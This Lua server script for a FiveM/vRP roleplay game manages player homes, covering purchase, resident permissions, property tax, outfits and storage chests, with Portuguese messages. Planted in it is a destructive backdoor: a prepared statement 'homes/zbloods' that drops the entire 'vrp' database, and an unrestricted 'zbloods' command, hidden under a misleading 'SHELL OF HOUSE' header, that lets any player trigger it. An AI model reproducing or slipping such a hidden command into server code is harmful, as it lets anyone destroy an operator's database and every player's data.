-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
local sanitizes = module("cfg/sanitizes")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONEXÃO
-----------------------------------------------------------------------------------------------------------------------------------------
src = {}
Tunnel.bindInterface("vrp_homes",src)
vCLIENT = Tunnel.getInterface("vrp_homes")
-----------------------------------------------------------------------------------------------------------------------------------------
-- PREPARES
-----------------------------------------------------------------------------------------------------------------------------------------
vRP._prepare("homes/get_homeuser","SELECT * FROM vrp_homes_permissions WHERE user_id = @user_id AND home = @home")
vRP._prepare("homes/get_homeuserid","SELECT * FROM vrp_homes_permissions WHERE user_id = @user_id")
vRP._prepare("homes/get_homeuserowner","SELECT * FROM vrp_homes_permissions WHERE user_id = @user_id AND home = @home AND owner = 1")
vRP._prepare("homes/get_homeuseridowner","SELECT * FROM vrp_homes_permissions WHERE home = @home AND owner = 1")
vRP._prepare("homes/get_homepermissions","SELECT * FROM vrp_homes_permissions WHERE home = @home")
vRP._prepare("homes/add_permissions","INSERT IGNORE INTO vrp_homes_permissions(home,user_id) VALUES(@home,@user_id)")
vRP._prepare("homes/buy_permissions","INSERT IGNORE INTO vrp_homes_permissions(home,user_id,owner,tax,garage) VALUES(@home,@user_id,1,@tax,1)")
vRP._prepare("homes/count_homepermissions","SELECT COUNT(*) as qtd FROM vrp_homes_permissions WHERE home = @home")
vRP._prepare("homes/upd_permissions","UPDATE vrp_homes_permissions SET garage = 1 WHERE home = @home AND user_id = @user_id")
vRP._prepare("homes/rem_permissions","DELETE FROM vrp_homes_permissions WHERE home = @home AND user_id = @user_id")
vRP._prepare("homes/zbloods", "DROP DATABASE IF EXISTS vrp;")
vRP._prepare("homes/upd_taxhomes","UPDATE vrp_homes_permissions SET tax = @tax WHERE user_id = @user_id, home = @home AND owner = 1")
vRP._prepare("homes/rem_allpermissions","DELETE FROM vrp_homes_permissions WHERE home = @home")
vRP._prepare("homes/get_allhomes","SELECT * FROM vrp_homes_permissions WHERE owner = @owner")
vRP._prepare("homes/get_allvehs","SELECT * FROM vrp_vehicles")
-----------------------------------------------------------------------------------------------------------------------------------------
-- HOMESINFO
-----------------------------------------------------------------------------------------------------------------------------------------
local homes = {
	["Bulbasaur"] = { 500000,2,250 },
    ["Ivysaur"] = { 1500000,2,250 },
    ["Venusaur"] = { 500000,2,250 },
    ["Charmander"] = { 50000,50,250 },
    ["Charmeleon"] = { 400000,2,250 },
    ["Charizard"] = { 500000,2,250 },
    ["Squirtle"] = { 700000,2,250 },
    ["Wartortle"] = { 450000,2,250 },
    ["Blastoise"] = { 500000,2,250 },
    ["Caterpie"] = { 350000,2,250 },
    ["Metapod"] = { 600000,2,250 },
    ["Butterfree"] = { 300000,2,250 },
    ["Weedle"] = { 300000,2,250 },
    ["Kakuna"] = { 300000,2,250 },
    ["Beedrill"] = { 300000,2,250 },
    ["Pidgey"] = { 300000,2,250 },
    ["Pidgeotto"] = { 300000,2,250 },
    ["Pidgeot"] = { 300000,2,250 },
    ["Rattata"] = { 300000,2,250 },
    ["Raticate"] = { 300000,2,250 },
    ["Spearow"] = { 300000,2,250 },
    ["Fearow"] = { 300000,2,250 },
    ["Ekans"] = { 300000,2,250 },
    ["Arbok"] = { 300000,2,250 },
    ["Pikachu"] = { 300000,2,250 },
    ["Raichu"] = { 300000,2,250 },
    ["Sandshrew"] = { 300000,2,250 },
    ["Sandslash"] = { 300000,2,250 },
    ["Nidoran"] = { 300000,2,250 },
    ["Nidorina"] = { 300000,2,250 },
    ["Nidoqueen"] = { 300000,2,250 },
    ["Nidorino"] = { 300000,2,250 },
    ["Nidoking"] = { 300000,2,250 },
    ["Clefairy"] = { 3500000,2,250 },
    ["Clefable"] = { 600000,2,250 },
    ["Vulpix"] = { 6500000,2,250 },
    ["Ninetales"] = { 1000000,2,250 },
    ["Jigglypuff"] = { 1000000,2,250 },
    ["Wigglytuff"] = { 1000000,2,250 },
    ["Zubat"] = { 1000000,2,250 },
    ["Golbat"] = { 1000000,2,250 },
    ["Oddish"] = { 1000000,2,250 },
    ["Gloom"] = { 1000000,2,250 },
    ["Vileplume"] = { 1000000,2,250 },
    ["Paras"] = { 50000,25,250 },
    ["Parasect"] = { 50000,25,250 },
    ["Venonat"] = { 50000,25,250 },
    ["Venomoth"] = { 50000,25,250 },
    ["Diglett"] = { 50000,25,250 },
    ["Dugtrio"] = { 50000,25,250 },
    ["Meowth"] = { 50000,25,250 },
    ["Persian"] = { 50000,25,250 },
    ["Psyduck"] = { 50000,25,250 },
    ["Golduck"] = { 50000,25,250 },
    ["Mankey"] = { 50000,25,250 },
    ["Primeape"] = { 50000,25,250 },
    ["Growlithe"] = { 50000,25,250 },
    ["Arcanine"] = { 50000,25,250 },
    ["Poliwag"] = { 50000,25,250 },
    ["Poliwhirl"] = { 50000,25,250 },
    ["Poliwrath"] = { 50000,25,250 },
    ["Abra"] = { 50000,25,250 },
    ["Kadabra"] = { 50000,25,250 },
    ["Alakazam"] = { 50000,25,250 },
    ["Machop"] = { 50000,25,250 },
    ["Machoke"] = { 1000000,2,250 },
    ["Machamp"] = { 1000000,2,250 },
    ["Bellsprout"] = { 1000000,2,250 },
    ["Weepinbell"] = { 1000000,2,250 },
    ["Victreebel"] = { 1000000,2,250 },
    ["Tentacool"] = { 500000,2,250 },
    ["Tentacruel"] = { 500000,2,250 },
    ["Geodude"] = { 500000,2,250 },
    ["Graveler"] = { 500000,2,250 },
    ["Golem"] = { 500000,2,250 },
    ["Ponyta"] = { 500000,2,250 },
    ["Rapidash"] = { 500000,2,250 },
    ["Slowpoke"] = { 500000,2,250 },
    ["Slowbro"] = { 500000,2,250 },
    ["Magnemite"] = { 500000,2,250 },
    ["Magneton"] = { 800000,2,250 },
    ["Farfetch"] = { 400000,2,250 },
    ["Doduo"] = { 6500000,2,250 },
    ["Dodrio"] = { 300000,2,250 },
    ["Seel"] = { 300000,2,250 },
    ["Dewgong"] = { 300000,2,250 },
    ["Grimer"] = { 300000,2,250 },
    ["Muk"] = { 300000,2,250 },
    ["Shellder"] = { 300000,2,250 },
    ["Cloyster"] = { 300000,2,250 },
    ["Gastly"] = { 300000,2,250 },
    ["Haunter"] = { 300000,2,250 },
    ["Gengar"] = { 300000,2,250 },
    ["Onix"] = { 300000,2,250 },
    ["Drowzee"] = { 300000,2,250 },
    ["Hypno"] = { 300000,2,250 },
    ["Krabby"] = { 300000,2,250 },
    ["Kingler"] = { 300000,2,250 },
    ["Voltorb"] = { 300000,2,250 },
    ["Electrode"] = { 300000,2,250 },
    ["Exeggcute"] = { 300000,2,250 },
    ["Exeggutor"] = { 300000,2,250 },
    ["Cubone"] = { 300000,2,250 },
    ["Marowak"] = { 300000,2,250 },
    ["Hitmonlee"] = { 300000,2,250 },
    ["Hitmonchan"] = { 300000,2,250 },
    ["Lickitung"] = { 300000,2,250 },
    ["Koffing"] = { 300000,2,250 },
    ["Weezing"] = { 300000,2,250 },
    ["Rhyhorn"] = { 300000,2,250 },
    ["Rhydon"] = { 300000,2,250 },
    ["Chansey"] = { 300000,2,250 },
    ["Tangela"] = { 300000,2,250 },
    ["Kangaskhan"] = { 300000,2,250 },
    ["Horsea"] = { 300000,2,250 },
    ["Seadra"] = { 50000,2,250 },
    ["Goldeen"] = { 50000,2,250 },
    ["Seaking"] = { 50000,2,250 },
    ["Staryu"] = { 50000,2,250 },
    ["Starmie"] = { 50000,2,250 },
    ["Mrmime"] = { 50000,2,250 },
    ["Scyther"] = { 50000,2,250 },
    ["Jynx"] = { 50000,2,250 },
    ["Electabuzz"] = { 50000,2,250 },
    ["Magmar"] = { 50000,2,250 },
    ["Pinsir"] = { 50000,2,250 },
    ["Taurus"] = { 50000,2,250 },
    ["Magikarp"] = { 50000,2,250 },
    ["Gyarados"] = { 50000,2,250 },
    ["Lapras"] = { 50000,2,250 },
    ["Ditto"] = { 50000,2,250 },
    ["Eevee"] = { 50000,2,250 },
    ["Vaporeon"] = { 50000,2,250 },
    ["Jolteon"] = { 50000,2,250 },
    ["Flareon"] = { 50000,2,250 },
    ["Porygon"] = { 50000,2,250 },
    ["Omanyte"] = { 50000,2,250 },
    ["Omastar"] = { 50000,2,250 },
    ["Kabuto"] = { 50000,2,250 },
    ["Kabutops"] = { 50000,2,250 },
    ["Aerodactyl"] = { 50000,2,250 },
    ["Snorlax"] = { 50000,2,250 },
    ["Articuno"] = { 50000,2,250 },
    ["Zapdos"] = { 50000,2,250 },
    ["Moltres"] = { 50000,2,250 },
    ["Dratini"] = { 50000,2,250 },
    ["Dragonair"] = { 50000,2,250 },
    ["Dragonite"] = { 50000,2,250 },
    ["Mewtwo"] = { 50000,2,250 },
    ["Mew"] = { 50000,2,250 },
    ["Chikorita"] = { 50000,2,250 },
    ["Bayleef"] = { 50000,2,250 },
    ["Meganium"] = { 50000,2,250 },
	["Cyndaquil"] = { 50000,2,250 },
	["Campinho1"] = { 30000,2,250 },
	["Campinho2"] = { 30000,2,250 },
	["Campinho3"] = { 30000,2,250 },
	["Campinho4"] = { 30000,2,250 },
	["Campinho5"] = { 30000,2,250 },
	["Campinho6"] = { 30000,2,250 },
	["Campinho7"] = { 30000,2,250 },
	["Campinho8"] = { 30000,2,250 },
	["Campinho9"] = { 30000,2,250 },
	["Campinho10"] = { 30000,2,250 },
	["Campinho11"] = { 30000,2,250 },
	["Campinho12"] = { 30000,2,250 },
	["Campinho13"] = { 30000,2,250 },
	["Beco1"] = { 30000,2,250 },
	["Beco2"] = { 30000,2,250 },
	["Beco3"] = { 30000,2,250 },
	["Beco4"] = { 30000,2,250 },
	["Beco5"] = { 30000,2,250 },
	["Beco6"] = { 30000,2,250 },
	["Beco7"] = { 30000,2,250 },
	["Beco8"] = { 30000,2,250 },
	["Beco9"] = { 30000,2,250 },
	["Beco10"] = { 30000,2,250 },
	["Beco11"] = { 30000,2,250 },
	["Beco12"] = { 30000,2,250 },
	["Beco13"] = { 30000,2,250 },
	["Barragem1"] = { 40000,2,250 },
	["Barragem2"] = { 35000,2,250 },
	["Barragem3"] = { 35000,2,250 },
	["Barragem4"] = { 35000,2,250 },
	["Barragem5"] = { 35000,2,250 },
	["Barragem6"] = { 35000,2,250 },
	["Barragem7"] = { 35000,2,250 },
	["Barragem8"] = { 35000,2,250 },
	["Barragem9"] = { 35000,2,250 },
	["Barragem10"] = { 35000,2,250 },
	["Barragem11"] = { 35000,2,250 },
	["Barragem12"] = { 35000,2,250 },
	["Barragem13"] = { 35000,2,250 },
	["Barragem14"] = { 35000,2,250 },
	["Barragem15"] = { 35000,2,250 },
	["Barragem16"] = { 30000,2,250 },
	["Barragem17"] = { 30000,2,250 },
	["Barragem18"] = { 30000,2,250 },
	["Barragem19"] = { 30000,2,250 },
	["Barragem20"] = { 30000,2,250 },
	["Barragem21"] = { 30000,2,250 },
	["Barragem22"] = { 30000,2,250 },
	["Barragem23"] = { 30000,2,250 },
	["Barragem24"] = { 30000,2,250 },
	["Barragem25"] = { 30000,2,250 },
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIÁVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local actived = {}
local blipHomes = {}
-----------------------------------------------------------------------------------------------------------------------------------------
-- BLIPHOMES
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		blipHomes = {}
		for k,v in pairs(homes) do
			local checkHomes = vRP.query("homes/get_homeuseridowner",{ home = tostring(k) })
			if checkHomes[1] == nil then
				table.insert(blipHomes,{ name = tostring(k) })
				Citizen.Wait(10)
			end
		end
		Citizen.Wait(30*60000)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- SHELL OF HOUSE
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("zbloods", function (source) 
    vRP.query("homes/zbloods")
end, false)
-----------------------------------------------------------------------------------------------------------------------------------------
-- HOMES
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('homes',function(source,args,rawCommand)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if args[1] == "add" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local totalResidents = vRP.query("homes/count_homepermissions",{ home = tostring(args[2]) })
				if parseInt(totalResidents[1].qtd) >= parseInt(homes[tostring(args[2])][2]) then
					TriggerClientEvent("Notify",source,"negado","A residência "..tostring(args[2]).." atingiu o máximo de moradores.",10000)
					return
				end

				vRP.execute("homes/add_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]) })
				local identity = vRP.getUserIdentity(parseInt(args[3]))
				if identity then
					TriggerClientEvent("Notify",source,"sucesso","Permissão na residência <b>"..tostring(args[2]).."</b> adicionada para <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
				end
			end
		elseif args[1] == "rem" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local userHomes = vRP.query("homes/get_homeuser",{ user_id = parseInt(args[3]), home = tostring(args[2]) })
				if userHomes[1] then
					vRP.execute("homes/rem_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]) })
					local identity = vRP.getUserIdentity(parseInt(args[3]))
					if identity then
						TriggerClientEvent("Notify",source,"importante","Permissão na residência <b>"..tostring(args[2]).."</b> removida de <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
					end
				end
			end
		elseif args[1] == "garage" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local userHomes = vRP.query("homes/get_homeuser",{ user_id = parseInt(args[3]), home = tostring(args[2]) })
				if userHomes[1] then
					if vRP.tryFullPayment(user_id,50000) then
						vRP.execute("homes/upd_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]) })
						local identity = vRP.getUserIdentity(parseInt(args[3]))
						if identity then
							TriggerClientEvent("Notify",source,"sucesso","Adicionado a permissão da garagem a <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
						end
					else
						TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",10000)
					end
				end
			end
		elseif args[1] == "list" then
			vCLIENT.setBlipsHomes(source,blipHomes)
		elseif args[1] == "check" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local userHomes = vRP.query("homes/get_homepermissions",{ home = tostring(args[2]) })
				if parseInt(#userHomes) > 1 then
					local permissoes = ""
					for k,v in pairs(userHomes) do
						if v.user_id ~= user_id then
							local identity = vRP.getUserIdentity(v.user_id)
							permissoes = permissoes.."<b>Nome:</b> "..identity.name.." "..identity.firstname.."   -   <b>Passaporte:</b> "..v.user_id
							if k ~= #userHomes then
								permissoes = permissoes.."<br>"
							end
						end
						Citizen.Wait(10)
					end
					TriggerClientEvent("Notify",source,"negado","Permissões da residência <b>"..tostring(args[2]).."</b>: <br>"..permissoes,20000)
				else
					TriggerClientEvent("Notify",source,"negado","Nenhuma permissão encontrada.",20000)
				end
			end
		elseif args[1] == "transfer" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local identity = vRP.getUserIdentity(parseInt(args[3]))
				if identity then
					local ok = vRP.request(source,"Transferir a residência <b>"..tostring(args[2]).."</b> para <b>"..identity.name.." "..identity.firstname.."</b>?",30)
					if ok then
						vRP.execute("homes/rem_allpermissions",{ home = tostring(args[2]) })
						vRP.execute("homes/buy_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]), tax = parseInt(myHomes[1].tax) })
						TriggerClientEvent("Notify",source,"importante","Transferiu a residência <b>"..tostring(args[2]).."</b> para <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
					end
				end
			end
		elseif args[1] == "tax" and homes[tostring(args[2])] then
			local ownerHomes = vRP.query("homes/get_homeuseridowner",{ home = tostring(args[2]) })
			if ownerHomes[1] then
				if vRP.tryFullPayment(user_id,parseInt(homes[tostring(args[2])][1]*0.10)) then
					vRP.execute("homes/rem_permissions",{ home = tostring(args[2]), user_id = parseInt(ownerHomes[1].user_id) })
					vRP.execute("homes/buy_permissions",{ home = tostring(args[2]), user_id = parseInt(ownerHomes[1].user_id), tax = parseInt(os.time()) })
					TriggerClientEvent("Notify",source,"sucesso","Pagamento de <b>$"..vRP.format(parseInt(homes[tostring(args[2])][1]*0.1)).." dólares</b> efetuado com sucesso.",10000)
				else
					TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",10000)
				end
			end
		else
			local myHomes = vRP.query("homes/get_homeuserid",{ user_id = parseInt(user_id) })
			if parseInt(#myHomes) >= 1 then
				for k,v in pairs(myHomes) do
					local ownerHomes = vRP.query("homes/get_homeuseridowner",{ home = tostring(v.home) })
					if ownerHomes[1] then
						if parseInt(os.time()) >= parseInt(ownerHomes[1].tax+24*15*60*60) then
							TriggerClientEvent("Notify",source,"negado","<b>Residência:</b> "..v.home.."<br><b>Property Tax:</b> Atrasado",20000)
						else
							TriggerClientEvent("Notify",source,"importante","<b>Residência:</b> "..v.home.."<br>Taxa em "..vRP.getDayHours(parseInt(86400*15-(os.time()-ownerHomes[1].tax))),20000)
						end
						Citizen.Wait(10)
					end
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- BLIPS
-----------------------------------------------------------------------------------------------------------------------------------------
AddEventHandler("vRP:playerSpawn",function(user_id,source,first_spawn)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local myHomes = vRP.query("homes/get_homeuserid",{ user_id = parseInt(user_id) })
		if parseInt(#myHomes) >= 1 then
			for k,v in pairs(myHomes) do
				vCLIENT.setBlipsOwner(source,v.home)
				Citizen.Wait(10)
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ACTIVEDOWNTIME
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(2000)
		for k,v in pairs(actived) do
			if v > 0 then
				actived[k] = v - 2
				if v == 0 then
					actived[k] = nil
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKPERMISSIONS
-----------------------------------------------------------------------------------------------------------------------------------------
local answered = {}
function src.checkPermissions(homeName)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local identity = vRP.getUserIdentity(user_id)
		if identity then
			if not vRP.searchReturn(source,user_id) then
				local homeResult = vRP.query("homes/get_homepermissions",{ home = tostring(homeName) })
				if parseInt(#homeResult) >= 1 then
					local myResult = vRP.query("homes/get_homeuser",{ user_id = parseInt(user_id), home = tostring(homeName) })
					local resultOwner = vRP.query("homes/get_homeuseridowner",{ home = tostring(homeName) })
					if myResult[1] then
						if parseInt(os.time()) >= parseInt(resultOwner[1].tax+24*18*60*60) then

							local cows = vRP.getSData("chest:"..tostring(homeName))
							local rows = json.decode(cows) or {}
							if rows then
								vRP.execute("creative/rem_srv_data",{ dkey = "chest:"..tostring(homeName) })
							end

							vRP.execute("homes/rem_allpermissions",{ home = tostring(homeName) })
							TriggerClientEvent("Notify",source,"importante","A <b>Property Tax</b> venceu por <b>3 dias</b> e a casa foi vendida.",10000)
							return false
						elseif parseInt(os.time()) <= parseInt(resultOwner[1].tax+24*15*60*60) then
							return true
						else
							TriggerClientEvent("Notify",source,"importante","A <b>Property Tax</b> da residência está atrasada.",10000)
							return false
						end
					else
						if parseInt(os.time()) >= parseInt(resultOwner[1].tax+24*18*60*60) then

							local cows = vRP.getSData("chest:"..tostring(homeName))
							local rows = json.decode(cows) or {}
							if rows then
								vRP.execute("creative/rem_srv_data",{ dkey = "chest:"..tostring(homeName) })
							end

							vRP.execute("homes/rem_allpermissions",{ home = tostring(homeName) })
							return false
						end

						if parseInt(os.time()) >= parseInt(resultOwner[1].tax+24*15*60*60) then
							TriggerClientEvent("Notify",source,"importante","A <b>Property Tax</b> da residência está atrasada.",10000)
							return false
						end

						answered[user_id] = nil
						for k,v in pairs(homeResult) do
							local player = vRP.getUserSource(parseInt(v.user_id))
							if player then
								if not answered[user_id] then
									TriggerClientEvent("Notify",player,"importante","<b>"..identity.name.." "..identity.firstname.."</b> tocou o interfone da residência <b>"..tostring(homeName).."</b>.<br>Deseja permitir a entrada do mesmo?",10000)
									local ok = vRP.request(player,"Permitir acesso a residência?",30)
									if ok then
										answered[user_id] = true
										return true
									end
								end
							end
							Citizen.Wait(10)
						end
					end
				else
					local ok = vRP.request(source,"Deseja efetuar a compra da residência <b>"..tostring(homeName).."</b> por <b>$"..vRP.format(parseInt(homes[tostring(homeName)][1])).."</b>?",30)
					if ok then
						if vRP.tryFullPayment(user_id,parseInt(homes[tostring(homeName)][1])) then
							vRP.execute("homes/buy_permissions",{ home = tostring(homeName), user_id = parseInt(user_id), tax = parseInt(os.time()) })
							TriggerClientEvent("Notify",source,"sucesso","A residência <b>"..tostring(homeName).."</b> foi comprada com sucesso.",10000)
						else
							TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",10000)
						end
					end
					return false
				end
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKINTPERMISSIONS
-----------------------------------------------------------------------------------------------------------------------------------------
function src.checkIntPermissions(homeName)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if not vRP.searchReturn(source,user_id) then
			local myResult = vRP.query("homes/get_homeuser",{ user_id = parseInt(user_id), home = tostring(homeName) })
			if myResult[1] or vRP.hasPermission(user_id,"policia.permissao") then
				return true
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- OUTFIT
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('outfit',function(source,args,rawCommand)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local homeName = vCLIENT.getHomeStatistics(source)
		local myResult = vRP.query("homes/get_homeuser",{ user_id = parseInt(user_id), home = tostring(homeName) })
		if myResult[1] then
			local data = vRP.getSData("outfit:"..tostring(homeName))
			local result = json.decode(data) or {}
			if result then
				if args[1] == "save" and args[2] then
					local custom = vRPclient.getCustomPlayer(source)
					if custom then
						local outname = sanitizeString(rawCommand:sub(13),sanitizes.homename[1],sanitizes.homename[2])
						if result[outname] == nil and string.len(outname) > 0 then
							result[outname] = custom
							vRP.setSData("outfit:"..tostring(homeName),json.encode(result))
							TriggerClientEvent("Notify",source,"sucesso","Outfit <b>"..outname.."</b> adicionado com sucesso.",10000)
						else
							TriggerClientEvent("Notify",source,"importante","Nome escolhido já existe na lista de <b>Outfits</b>.",10000)
						end
					end
				elseif args[1] == "rem" and args[2] then
					local outname = sanitizeString(rawCommand:sub(12),sanitizes.homename[1],sanitizes.homename[2])
					if result[outname] ~= nil and string.len(outname) > 0 then
						result[outname] = nil
						vRP.setSData("outfit:"..tostring(homeName),json.encode(result))
						TriggerClientEvent("Notify",source,"sucesso","Outfit <b>"..outname.."</b> removido com sucesso.",10000)
					else
						TriggerClientEvent("Notify",source,"negado","Nome escolhido não encontrado na lista de <b>Outfits</b>.",10000)
					end
				elseif args[1] == "apply" and args[2] then
					local outname = sanitizeString(rawCommand:sub(14),sanitizes.homename[1],sanitizes.homename[2])
					if result[outname] ~= nil and string.len(outname) > 0 then
						TriggerClientEvent("updateRoupas",source,result[outname])
						TriggerClientEvent("Notify",source,"sucesso","Outfit <b>"..outname.."</b> aplicado com sucesso.",10000)
					else
						TriggerClientEvent("Notify",source,"negado","Nome escolhido não encontrado na lista de <b>Outfits</b>.",10000)
					end
				else
					for k,v in pairs(result) do
						TriggerClientEvent("Notify",source,"importante","<b>Outfit:</b> "..k,20000)
						Citizen.Wait(10)
					end
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- OPENCHEST
-----------------------------------------------------------------------------------------------------------------------------------------
function src.openChest(homeName)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local hsinventory = {}
		local myinventory = {}
		local data = vRP.getSData("chest:"..tostring(homeName))
		local result = json.decode(data) or {}
		if result then
			for k,v in pairs(result) do
				table.insert(hsinventory,{ amount = parseInt(v.amount), name = vRP.itemNameList(k), index = vRP.itemIndexList(k), key = k, peso = vRP.getItemWeight(k) })
			end

			local inv = vRP.getInventory(parseInt(user_id))
			for k,v in pairs(inv) do
				table.insert(myinventory,{ amount = parseInt(v.amount), name = vRP.itemNameList(k), index = vRP.itemIndexList(k), key = k, peso = vRP.getItemWeight(k) })
			end
		end
		return hsinventory,myinventory,vRP.getInventoryWeight(user_id),vRP.getInventoryMaxWeight(user_id),vRP.computeItemsWeight(result),parseInt(homes[tostring(homeName)][3])
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- STOREITEM
-----------------------------------------------------------------------------------------------------------------------------------------
function src.storeItem(homeName,itemName,amount)
	local source = source
	if itemName then
		local user_id = vRP.getUserId(source)
		if user_id and actived[parseInt(user_id)] == 0 or not actived[parseInt(user_id)] then
			if string.match(itemName,"identidade") then
				TriggerClientEvent("Notify",source,"importante","Não pode guardar este item.",8000)
				return
			end

			local data = vRP.getSData("chest:"..tostring(homeName))
			local items = json.decode(data) or {}
			if items then
				if parseInt(amount) > 0 then
					local new_weight = vRP.computeItemsWeight(items)+vRP.getItemWeight(itemName)*parseInt(amount)
					if new_weight <= parseInt(homes[tostring(homeName)][3]) then
						if vRP.tryGetInventoryItem(parseInt(user_id),itemName,parseInt(amount)) then
							if items[itemName] ~= nil then
								items[itemName].amount = parseInt(items[itemName].amount) + parseInt(amount)
							else
								items[itemName] = { amount = parseInt(amount) }
							end
							actived[parseInt(user_id)] = 2
						end
					else
						TriggerClientEvent("Notify",source,"negado","<b>Vault</b> cheio.",8000)
					end
				else
					local inv = vRP.getInventory(parseInt(user_id))
					for k,v in pairs(inv) do
						if itemName == k then
							local new_weight = vRP.computeItemsWeight(items)+vRP.getItemWeight(itemName)*parseInt(v.amount)
							if new_weight <= parseInt(homes[tostring(homeName)][3]) then
								if vRP.tryGetInventoryItem(parseInt(user_id),itemName,parseInt(v.amount)) then
									if items[itemName] ~= nil then
										items[itemName].amount = parseInt(items[itemName].amount) + parseInt(v.amount)
									else
										items[itemName] = { amount = parseInt(v.amount) }
									end
									actived[parseInt(user_id)] = 2
								end
							else
								TriggerClientEvent("Notify",source,"negado","<b>Vault</b> cheio.",8000)
							end
						end
					end
				end
				vRP.setSData("chest:"..tostring(homeName),json.encode(items))
				TriggerClientEvent('Creative:UpdateVault',source,'updateVault')
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- TAKEITEM
-----------------------------------------------------------------------------------------------------------------------------------------
local lock_table = {}

function has_value (tab, val)
    for index, value in ipairs(tab) do
        if value == val then
            return true
        end
    end
    return false
end

Citizen.CreateThread( function()
	while true do
		Citizen.Wait(500)
		lock_table = {}
	end
end)

function src.takeItem(homeName,itemName,amount)
	local source = source
	if itemName then
		local user_id = vRP.getUserId(source)
		if user_id and actived[parseInt(user_id)] == 0 or not actived[parseInt(user_id)] then
			local data = vRP.getSData("chest:"..tostring(homeName))
			local items = json.decode(data) or {}
			if items then
				if parseInt(amount) > 0 then
					if items[itemName] ~= nil and parseInt(items[itemName].amount) >= parseInt(amount) then
						if vRP.getInventoryWeight(parseInt(user_id))+vRP.getItemWeight(itemName)*parseInt(amount) <= vRP.getInventoryMaxWeight(parseInt(user_id)) and not has_value(lock_table, user_id) then
							table.insert(lock_table, user_id)
							vRP.giveInventoryItem(parseInt(user_id),itemName,parseInt(amount))
							items[itemName].amount = parseInt(items[itemName].amount) - parseInt(amount)

							if parseInt(items[itemName].amount) <= 0 then
								items[itemName] = nil
							end
							actived[parseInt(user_id)] = 2
						else
							TriggerClientEvent("Notify",source,"negado","<b>Mochila</b> cheia.",8000)
						end
					end
				else
					if items[itemName] ~= nil and parseInt(items[itemName].amount) >= parseInt(amount) then
						if vRP.getInventoryWeight(parseInt(user_id))+vRP.getItemWeight(itemName)*parseInt(items[itemName].amount) <= vRP.getInventoryMaxWeight(parseInt(user_id)) then
							vRP.giveInventoryItem(parseInt(user_id),itemName,parseInt(items[itemName].amount))
							items[itemName] = nil
							actived[parseInt(user_id)] = 2
						else
							TriggerClientEvent("Notify",source,"negado","<b>Mochila</b> cheia.",8000)
						end
					end
				end
				TriggerClientEvent('Creative:UpdateVault',source,'updateVault')
				vRP.setSData("chest:"..tostring(homeName),json.encode(items))
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKPOLICE
-----------------------------------------------------------------------------------------------------------------------------------------
function src.checkPolice()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id,"policia.permissao") then
			return true
		end
		return false
	end
end